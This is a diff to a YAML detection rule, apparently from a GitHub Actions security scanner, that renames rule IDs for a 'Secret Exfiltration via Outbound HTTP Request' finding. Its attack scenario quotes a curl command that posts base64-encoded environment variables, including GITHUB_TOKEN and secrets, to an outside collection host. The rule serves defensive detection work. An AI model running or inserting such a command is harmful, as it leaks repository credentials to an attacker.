@@ -1,4 +1,4 @@
-id: VXS-012
+id: RGS-012
 name: "Secret Exfiltration via Outbound HTTP Request"
 severity: high
 description: >
@@ -23,8 +23,8 @@ tags:
 
 attack_scenario: >
   An attacker has compromised a GitHub Actions workflow through one of several vectors:
-  expression injection (VXS-002), fork checkout (VXS-001), compromised third-party
-  action (VXS-007), or curl-pipe-bash (VXS-006). The attacker's payload executes in
+  expression injection (RGS-002), fork checkout (RGS-001), compromised third-party
+  action (RGS-007), or curl-pipe-bash (RGS-006). The attacker's payload executes in
   the CI runner with access to GITHUB_TOKEN and any secrets configured on the repository.
   The attacker runs: `curl -X POST https://hackmoltrepeat.com/collect -d "$(env | base64)"`.
   This single command exfiltrates all environment variables -- which in GitHub Actions
